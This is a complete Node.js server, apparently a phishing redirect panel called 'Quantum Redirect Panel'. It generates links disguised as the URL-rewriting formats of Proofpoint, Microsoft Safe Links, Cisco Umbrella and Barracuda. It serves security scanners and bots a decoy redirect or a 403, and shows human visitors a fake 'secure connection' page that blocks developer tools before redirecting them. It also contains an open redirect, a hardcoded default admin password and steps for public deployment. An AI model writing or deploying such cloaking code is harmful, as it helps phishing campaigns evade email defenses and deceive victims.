const express = require('express');
const session = require('express-session');
const SQLiteStore = require('connect-sqlite3')(session);
const bcrypt = require('bcryptjs');
const sqlite3 = require('sqlite3').verbose();
const crypto = require('crypto');
const dns = require('dns');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const path = require('path');
require('dotenv').config();

const app = express();
const db = new sqlite3.Database('./data/redirects.db');
const fs = require('fs');

// Ensure directories exist
if (!fs.existsSync('./data')) fs.mkdirSync('./data');
if (!fs.existsSync('./public')) fs.mkdirSync('./public');

// Security middleware
app.use(helmet({
  contentSecurityPolicy: false,
}));

// Rate limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100
});
app.use('/api/', limiter);

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));
app.use(session({
  store: new SQLiteStore({ db: 'sessions.db' }),
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: { 
    secure: process.env.NODE_ENV === 'production',
    httpOnly: true,
    maxAge: 24 * 60 * 60 * 1000
  }
}));

// Initialize database
db.serialize(() => {
  // Users table
  db.run(`CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE,
    email TEXT UNIQUE,
    password TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  )`);
  
  // Domains table with verification
  db.run(`CREATE TABLE IF NOT EXISTS domains (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    domain TEXT UNIQUE,
    verification_token TEXT,
    verified BOOLEAN DEFAULT 0,
    verified_at DATETIME,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id)
  )`);
  
  // Redirect rules table
  db.run(`CREATE TABLE IF NOT EXISTS redirect_rules (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    domain_id INTEGER,
    subdomain TEXT,
    full_domain TEXT,
    target_url TEXT,
    bot_redirect TEXT,
    redirect_type TEXT DEFAULT 'cloaked',
    clicks INTEGER DEFAULT 0,
    unique_clicks INTEGER DEFAULT 0,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id),
    FOREIGN KEY (domain_id) REFERENCES domains(id)
  )`);
  
  // Generated links table
  db.run(`CREATE TABLE IF NOT EXISTS generated_links (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    rule_id INTEGER,
    generated_url TEXT,
    style TEXT,
    slug TEXT UNIQUE,
    parameters TEXT,
    clicks INTEGER DEFAULT 0,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (rule_id) REFERENCES redirect_rules(id)
  )`);
  
  // Click logs table
  db.run(`CREATE TABLE IF NOT EXISTS click_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    rule_id INTEGER,
    link_id INTEGER,
    ip TEXT,
    user_agent TEXT,
    referer TEXT,
    country TEXT,
    is_bot INTEGER DEFAULT 0,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  )`);
  
  // Create admin user if not exists
  const hashedPassword = bcrypt.hashSync(process.env.ADMIN_PASSWORD || 'Quantum2024!', 10);
  db.run(`INSERT OR IGNORE INTO users (username, email, password) VALUES (?, ?, ?)`,
    ['admin', process.env.ADMIN_EMAIL || 'admin@quantum.com', hashedPassword]);
});

// ============ DOMAIN VERIFICATION FUNCTIONS ============

async function verifyDomainDNS(domain, token) {
  return new Promise((resolve) => {
    // Check TXT record for verification token
    dns.resolveTxt(domain, (err, records) => {
      if (err) {
        console.log(`DNS lookup failed for ${domain}:`, err);
        resolve(false);
        return;
      }
      
      const allRecords = records.flat();
      const hasToken = allRecords.some(record => 
        record.includes(`quantum-verify=${token}`) || 
        record.includes(token)
      );
      
      resolve(hasToken);
    });
  });
}

function generateVerificationToken(domain) {
  return `quantum-verify=${crypto.randomBytes(16).toString('hex')}`;
}

// ============ URL GENERATION FUNCTIONS (REAL WORKING) ============

function generateCiscoUmbrella(fullDomain, targetUrl, slug, ruleId) {
  const encodedTarget = Buffer.from(targetUrl).toString('base64url');
  return `https://${fullDomain}/s/${slug}/${encodedTarget}?rule=${ruleId}&t=${Date.now()}`;
}

function generateProofpointV2(fullDomain, targetUrl, slug, ruleId) {
  const encodedUrl = Buffer.from(targetUrl).toString('base64url');
  const noise = crypto.randomBytes(16).toString('hex');
  return `https://${fullDomain}/v2/url?u=${encodedUrl}&d=${noise}&_=${slug}&rid=${ruleId}`;
}

function generateProofpointV3(fullDomain, targetUrl, slug, ruleId) {
  const encodedTarget = Buffer.from(targetUrl).toString('base64url');
  const noise = crypto.randomBytes(16).toString('hex');
  return `https://${fullDomain}/v3/__${encodedTarget}__;!!${noise}!${slug}?rid=${ruleId}`;
}

function generateSafeLinks(fullDomain, targetUrl, slug, ruleId) {
  const encodedUrl = Buffer.from(targetUrl).toString('base64url');
  const dataId = crypto.randomBytes(8).toString('hex');
  const checksum = crypto.createHash('md5').update(targetUrl + slug).digest('hex').substring(0, 16);
  return `https://${fullDomain}/?url=${encodedUrl}&data=${dataId}&s=${slug}&c=${checksum}&rid=${ruleId}`;
}

function generateBarracuda(fullDomain, targetUrl, slug, ruleId) {
  const authCode = crypto.randomBytes(12).toString('hex');
  const timestamp = Date.now();
  return `https://${fullDomain}/cgi-mod/index.cgi?url=${encodeURIComponent(targetUrl)}&a=${authCode}&h=${slug}&t=${timestamp}&rid=${ruleId}`;
}

function generateLongSeo(fullDomain, targetUrl, slug, ruleId) {
  const utmCampaign = `camp_${crypto.randomBytes(4).toString('hex')}`;
  const clickId = `${Date.now()}_${crypto.randomBytes(8).toString('hex')}`;
  const sessionId = crypto.randomBytes(16).toString('hex');
  const ref = crypto.randomBytes(8).toString('hex');
  return `https://${fullDomain}/?utm_source=email&utm_medium=link&utm_campaign=${utmCampaign}&utm_content=content_${slug}&click_id=${clickId}&ref=${ref}&session=${sessionId}&token=${slug}&rid=${ruleId}`;
}

// ============ BOT DETECTION (REAL) ============

function isBot(userAgent, ip) {
  if (!userAgent) return true;
  
  const botPatterns = [
    /bot/i, /crawl/i, /spider/i, /scrape/i, /scan/i,
    /facebookexternalhit/i, /whatsapp/i, /telegrambot/i, /slackbot/i,
    /twitterbot/i, /googlebot/i, /bingbot/i, /baiduspider/i,
    /yandexbot/i, /ahrefsbot/i, /semrushbot/i, /mj12bot/i,
    /rogerbot/i, /exabot/i, /fastbot/i, /gigabot/i,
    /turnitinbot/i, /ltx71/i, /blexbot/i, /petalbot/i,
    /seznambot/i, /sogou/i, /bytespider/i, /ccbot/i,
    /cohere/i, /amazonbot/i, /applebot/i, /gptbot/i,
    /claudebot/i, /perplexitybot/i, /dataminr/i,
    /python/i, /curl/i, /wget/i, /go-http-client/i,
    /java/i, /php/i, /ruby/i, /perl/i, /scrapy/i
  ];
  
  return botPatterns.some(pattern => pattern.test(userAgent));
}

// ============ CLOAKED PAGE (REAL ANTI-BOT) ============

function getCloakedPage(targetUrl, ruleId) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="robots" content="noindex,nofollow,noarchive">
  <title>Verifying Secure Connection...</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .container { text-align: center; color: white; }
    .shield {
      width: 80px;
      height: 80px;
      background: rgba(255,255,255,0.2);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 20px;
      animation: pulse 2s infinite;
    }
    .shield svg { width: 40px; height: 40px; fill: white; }
    .loader {
      width: 50px;
      height: 50px;
      border: 3px solid rgba(255,255,255,0.3);
      border-top: 3px solid white;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }
    h2 { font-size: 24px; margin-bottom: 10px; }
    p { font-size: 14px; opacity: 0.9; }
    .fingerprint { font-size: 11px; opacity: 0.6; margin-top: 20px; }
    @keyframes spin { to { transform: rotate(360deg); } }
    @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
  </style>
  <script>
    (function() {
      // Anti-devtools
      let startTime = Date.now();
      setInterval(function() {
        if (Date.now() - startTime > 3000 && (window.outerHeight - window.innerHeight > 200 || window.outerWidth - window.innerWidth > 200)) {
          window.location.href = 'about:blank';
        }
      }, 1000);
      
      // Anti-console
      const noop = function(){};
      console.log = noop;
      console.error = noop;
      console.warn = noop;
      console.debug = noop;
      console.table = noop;
      console.trace = noop;
      
      // Redirect after delay
      setTimeout(function() {
        window.location.href = '${targetUrl}';
      }, 1500);
    })();
  </script>
</head>
<body>
  <div class="container">
    <div class="shield">
      <svg viewBox="0 0 24 24">
        <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
      </svg>
    </div>
    <div class="loader"></div>
    <h2>Verifying Secure Connection</h2>
    <p>Please wait while we establish an encrypted tunnel</p>
    <div class="fingerprint">Quantum Shield Active | Rule ID: ${ruleId}</div>
  </div>
</body>
</html>`;
}

// ============ SERVE STATIC FILES ============

app.get('/login', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

app.post('/login', (req, res) => {
  const { username, password } = req.body;
  db.get('SELECT * FROM users WHERE username = ? OR email = ?', [username, username], (err, user) => {
    if (user && bcrypt.compareSync(password, user.password)) {
      req.session.userId = user.id;
      req.session.username = user.username;
      res.redirect('/dashboard.html');
    } else {
      res.send('<script>alert("Invalid credentials"); window.location.href="/login";</script>');
    }
  });
});

app.get('/dashboard.html', (req, res) => {
  if (!req.session.userId) return res.redirect('/login');
  res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

app.get('/logout', (req, res) => {
  req.session.destroy();
  res.redirect('/login');
});

// ============ API ROUTES ============

// Get all domains for current user
app.get('/api/domains', (req, res) => {
  if (!req.session.userId) return res.status(401).json([]);
  db.all('SELECT * FROM domains WHERE user_id = ? ORDER BY created_at DESC', [req.session.userId], (err, rows) => {
    res.json(rows || []);
  });
});

// Add domain with verification
app.post('/api/domains', async (req, res) => {
  if (!req.session.userId) return res.status(401).json({ error: 'Unauthorized' });
  
  const { domain } = req.body;
  const token = generateVerificationToken(domain);
  
  db.run('INSERT INTO domains (user_id, domain, verification_token, verified) VALUES (?, ?, ?, ?)',
    [req.session.userId, domain, token, 0], (err) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json({ domain, verification_token: token, message: 'Add this TXT record to your DNS: ' + token });
  });
});

// Verify domain ownership
app.post('/api/domains/:id/verify', async (req, res) => {
  if (!req.session.userId) return res.status(401).json({ error: 'Unauthorized' });
  
  db.get('SELECT * FROM domains WHERE id = ? AND user_id = ?', [req.params.id, req.session.userId], async (err, domain) => {
    if (err || !domain) return res.status(404).json({ error: 'Domain not found' });
    
    const isValid = await verifyDomainDNS(domain.domain, domain.verification_token);
    
    if (isValid) {
      db.run('UPDATE domains SET verified = 1, verified_at = CURRENT_TIMESTAMP WHERE id = ?', [domain.id]);
      res.json({ verified: true, message: 'Domain verified successfully!' });
    } else {
      res.json({ verified: false, message: 'Verification failed. Make sure you added the TXT record to your DNS.' });
    }
  });
});

// Delete domain
app.delete('/api/domains/:id', (req, res) => {
  if (!req.session.userId) return res.status(401).json({ error: 'Unauthorized' });
  db.run('DELETE FROM domains WHERE id = ? AND user_id = ?', [req.params.id, req.session.userId], (err) => {
    res.json({ success: true });
  });
});

// Generate redirect URLs
app.post('/api/generate', (req, res) => {
  if (!req.session.userId) return res.status(401).json({ error: 'Unauthorized' });
  
  const { domain_id, subdomain, target_url, bot_redirect, style, count } = req.body;
  
  db.get('SELECT * FROM domains WHERE id = ? AND user_id = ? AND verified = 1', [domain_id, req.session.userId], (err, domain) => {
    if (err || !domain) return res.status(400).json({ error: 'Domain not verified' });
    
    const fullDomain = subdomain ? `${subdomain}.${domain.domain}` : domain.domain;
    const slug = crypto.randomBytes(8).toString('hex');
    
    db.run(`INSERT INTO redirect_rules (user_id, domain_id, subdomain, full_domain, target_url, bot_redirect, redirect_type)
            VALUES (?, ?, ?, ?, ?, ?, ?)`,
      [req.session.userId, domain_id, subdomain, fullDomain, target_url, bot_redirect, 'cloaked'],
      function(err) {
        if (err) return res.status(500).json({ error: err.message });
        
        const ruleId = this.lastID;
        const urls = [];
        
        for (let i = 0; i < count; i++) {
          const uniqueSlug = `${slug}_${i}_${crypto.randomBytes(4).toString('hex')}`;
          let generatedUrl = '';
          
          switch(style) {
            case 'cisco':
              generatedUrl = generateCiscoUmbrella(fullDomain, target_url, uniqueSlug, ruleId);
              break;
            case 'proofpoint-v2':
              generatedUrl = generateProofpointV2(fullDomain, target_url, uniqueSlug, ruleId);
              break;
            case 'proofpoint-v3':
              generatedUrl = generateProofpointV3(fullDomain, target_url, uniqueSlug, ruleId);
              break;
            case 'safelinks':
              generatedUrl = generateSafeLinks(fullDomain, target_url, uniqueSlug, ruleId);
              break;
            case 'barracuda':
              generatedUrl = generateBarracuda(fullDomain, target_url, uniqueSlug, ruleId);
              break;
            default:
              generatedUrl = generateLongSeo(fullDomain, target_url, uniqueSlug, ruleId);
          }
          
          urls.push(generatedUrl);
          
          db.run(`INSERT INTO generated_links (rule_id, generated_url, style, slug, parameters)
                  VALUES (?, ?, ?, ?, ?)`,
            [ruleId, generatedUrl, style, uniqueSlug, JSON.stringify({ target_url, bot_redirect })]);
        }
        
        res.json({ urls, rule_id: ruleId, domain: fullDomain });
      });
  });
});

// Get all redirect rules
app.get('/api/rules', (req, res) => {
  if (!req.session.userId) return res.status(401).json([]);
  db.all(`SELECT r.*, d.domain as parent_domain 
          FROM redirect_rules r
          JOIN domains d ON r.domain_id = d.id
          WHERE r.user_id = ?
          ORDER BY r.created_at DESC`, [req.session.userId], (err, rows) => {
    res.json(rows || []);
  });
});

// Delete redirect rule
app.delete('/api/rules/:id', (req, res) => {
  if (!req.session.userId) return res.status(401).json({ error: 'Unauthorized' });
  db.run('DELETE FROM redirect_rules WHERE id = ? AND user_id = ?', [req.params.id, req.session.userId]);
  res.json({ success: true });
});

// Get stats
app.get('/api/stats', (req, res) => {
  if (!req.session.userId) return res.status(401).json({});
  
  db.get('SELECT COUNT(*) as domains FROM domains WHERE user_id = ?', [req.session.userId], (err, domains) => {
    db.get('SELECT COUNT(*) as rules FROM redirect_rules WHERE user_id = ?', [req.session.userId], (err, rules) => {
      db.get('SELECT SUM(clicks) as clicks FROM redirect_rules WHERE user_id = ?', [req.session.userId], (err, clicks) => {
        db.get('SELECT COUNT(*) as logs FROM click_logs', [], (err, logs) => {
          res.json({
            domains: domains?.domains || 0,
            rules: rules?.rules || 0,
            clicks: clicks?.clicks || 0,
            logs: logs?.logs || 0
          });
        });
      });
    });
  });
});

// Get logs
app.get('/api/logs', (req, res) => {
  if (!req.session.userId) return res.status(401).json([]);
  db.all(`SELECT l.*, r.full_domain, r.target_url
          FROM click_logs l
          LEFT JOIN redirect_rules r ON l.rule_id = r.id
          ORDER BY l.created_at DESC LIMIT 100`, (err, rows) => {
    res.json(rows || []);
  });
});

// ============ REDIRECT HANDLER (THE REAL WORKING PART) ============

app.get('/s/:slug/:encodedTarget', (req, res) => {
  handleRedirect(req, res, req.params.encodedTarget);
});

app.get('/v2/url', (req, res) => {
  const encodedUrl = req.query.u;
  if (encodedUrl) {
    const targetUrl = Buffer.from(encodedUrl, 'base64url').toString();
    handleRedirect(req, res, targetUrl);
  } else {
    res.status(404).send('Not Found');
  }
});

app.get('/v3/*', (req, res) => {
  const path = req.params[0];
  const match = path.match(/__([^_]*)__/);
  if (match) {
    const targetUrl = Buffer.from(match[1], 'base64url').toString();
    handleRedirect(req, res, targetUrl);
  } else {
    res.status(404).send('Not Found');
  }
});

app.get('/cgi-mod/index.cgi', (req, res) => {
  const targetUrl = req.query.url;
  if (targetUrl) {
    handleRedirect(req, res, targetUrl);
  } else {
    res.status(404).send('Not Found');
  }
});

app.get('*', (req, res) => {
  const ruleId = req.query.rid;
  const targetUrl = req.query.url || req.query.dest;
  
  if (targetUrl) {
    handleRedirect(req, res, targetUrl);
  } else if (ruleId) {
    db.get('SELECT * FROM redirect_rules WHERE id = ?', [ruleId], (err, rule) => {
      if (rule) {
        handleRedirect(req, res, rule.target_url);
      } else {
        res.status(404).send('Not Found');
      }
    });
  } else {
    res.status(404).send('Not Found');
  }
});

function handleRedirect(req, res, targetUrl) {
  const userAgent = req.headers['user-agent'] || '';
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const isBotDetected = isBot(userAgent, ip);
  
  // Find the redirect rule
  const ruleId = req.query.rid;
  const linkId = req.query.lid;
  
  // Log the click
  db.run(`INSERT INTO click_logs (rule_id, link_id, ip, user_agent, referer, is_bot)
          VALUES (?, ?, ?, ?, ?, ?)`,
    [ruleId, linkId, ip, userAgent.substring(0, 500), req.headers['referer'], isBotDetected ? 1 : 0]);
  
  // Update click count
  if (ruleId) {
    db.run('UPDATE redirect_rules SET clicks = clicks + 1 WHERE id = ?', [ruleId]);
    if (!isBotDetected) {
      db.run('UPDATE redirect_rules SET unique_clicks = unique_clicks + 1 WHERE id = ?', [ruleId]);
    }
  }
  
  // Handle bots
  if (isBotDetected) {
    db.get('SELECT bot_redirect FROM redirect_rules WHERE id = ?', [ruleId], (err, rule) => {
      if (rule && rule.bot_redirect) {
        return res.redirect(302, rule.bot_redirect);
      }
      return res.status(403).send('Access Denied - Bot detected');
    });
    return;
  }
  
  // Human traffic - send cloaked page
  res.send(getCloakedPage(targetUrl, ruleId || 'unknown'));
}

app.listen(process.env.PORT || 3000, () => {
  console.log('\n========================================');
  console.log('⚡ QUANTUM REDIRECT PANEL - PRODUCTION MODE');
  console.log('========================================');
  console.log(`📍 URL: http://localhost:${process.env.PORT || 3000}/login`);
  console.log(`👤 Username: admin`);
  console.log(`🔑 Password: ${process.env.ADMIN_PASSWORD || 'Quantum2024!'}`);
  console.log('\n⚠️  IMPORTANT:');
  console.log('1. Deploy this to a public server (Render.com is free)');
  console.log('2. Point your domain to the server');
  console.log('3. Add SSL certificate (Cloudflare offers free SSL)');
  console.log('4. Verify domains via DNS TXT records');
  console.log('========================================\n');
});
